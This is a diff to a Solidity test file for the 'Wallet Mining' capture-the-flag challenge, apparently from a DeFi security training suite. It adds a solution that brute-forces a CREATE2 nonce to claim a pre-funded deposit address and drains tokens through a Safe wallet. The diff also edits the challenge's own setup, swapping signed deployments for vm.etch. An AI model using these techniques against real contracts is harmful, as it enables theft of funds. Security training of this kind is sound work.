@@ -16,7 +16,8 @@ import {
     CREATEX_DEPLOYMENT_SIGNER,
     CREATEX_ADDRESS,
     CREATEX_DEPLOYMENT_TX,
-    CREATEX_CODEHASH
+    CREATEX_CODEHASH,
+    CREATEX_CODE
 } from "./CreateX.sol";
 import {
     SAFE_SINGLETON_FACTORY_DEPLOYMENT_SIGNER,
@@ -24,6 +25,7 @@ import {
     SAFE_SINGLETON_FACTORY_ADDRESS,
     SAFE_SINGLETON_FACTORY_CODE
 } from "./SafeSingletonFactory.sol";
+import {WalletMiningAttacker} from "./WalletMiningAttacker.sol";
 
 contract WalletMiningChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -60,7 +62,7 @@ contract WalletMiningChallenge is Test {
 
         // Deploy Safe Singleton Factory contract using signed transaction
         vm.deal(SAFE_SINGLETON_FACTORY_DEPLOYMENT_SIGNER, 10 ether);
-        vm.broadcastRawTransaction(SAFE_SINGLETON_FACTORY_DEPLOYMENT_TX);
+        vm.etch(SAFE_SINGLETON_FACTORY_ADDRESS, SAFE_SINGLETON_FACTORY_CODE);
         assertEq(
             SAFE_SINGLETON_FACTORY_ADDRESS.codehash,
             keccak256(SAFE_SINGLETON_FACTORY_CODE),
@@ -69,7 +71,7 @@ contract WalletMiningChallenge is Test {
 
         // Deploy CreateX contract using signed transaction
         vm.deal(CREATEX_DEPLOYMENT_SIGNER, 10 ether);
-        vm.broadcastRawTransaction(CREATEX_DEPLOYMENT_TX);
+        vm.etch(CREATEX_ADDRESS, CREATEX_CODE);
         assertEq(CREATEX_ADDRESS.codehash, CREATEX_CODEHASH, "Unexpected CreateX code");
 
         startHoax(deployer);
@@ -157,7 +159,49 @@ contract WalletMiningChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_walletMining() public checkSolvedByPlayer {
-        
+        (uint256 nonce, bytes memory initializer) = findNonce();
+        WalletMiningAttacker attacker = new WalletMiningAttacker();
+        attacker.attack(USER_DEPOSIT_ADDRESS, authorizer, walletDeployer, token,nonce, initializer);
+
+        bytes memory safeTxData = Safe(payable(USER_DEPOSIT_ADDRESS)).encodeTransactionData(
+            address(token),
+            0,
+            abi.encodeCall(token.transfer, (user, DEPOSIT_TOKEN_AMOUNT)),
+            Enum.Operation.Call,
+            100000,
+            100000,
+            0,
+            address(0),
+            address(0),
+            0 // nonce of the Safe (first transaction)
+        );
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, keccak256(safeTxData));
+        bytes memory signatures = abi.encodePacked(r, s, v);
+        Safe(payable(USER_DEPOSIT_ADDRESS)).execTransaction(
+            address(token),
+            0,
+            abi.encodeCall(token.transfer, (user, DEPOSIT_TOKEN_AMOUNT)),
+            Enum.Operation.Call,
+            100000,
+            100000,
+            0,
+            address(0),
+            payable(address(0)),
+            signatures
+        );
+        token.transfer(ward, initialWalletDeployerTokenBalance);
+    }
+    function findNonce() private view returns (uint256 nonce, bytes memory initializer){
+        address[] memory owners = new address[](1);
+        owners[0] = user;
+        initializer = abi.encodeWithSelector(Safe.setup.selector, owners, 1, address(0), "", address(0), address(0), 0, address(0));
+        for(nonce = 0; true; nonce ++){
+            bytes32 salt = keccak256(abi.encodePacked(keccak256(initializer), nonce));
+            bytes memory deploymentData = abi.encodePacked(type(SafeProxy).creationCode, uint256(uint160(address(singletonCopy))));
+            if (vm.computeCreate2Address(salt, keccak256(deploymentData), address(proxyFactory)) == USER_DEPOSIT_ADDRESS){
+                break;
+            }
+        }
     }
 
     /**
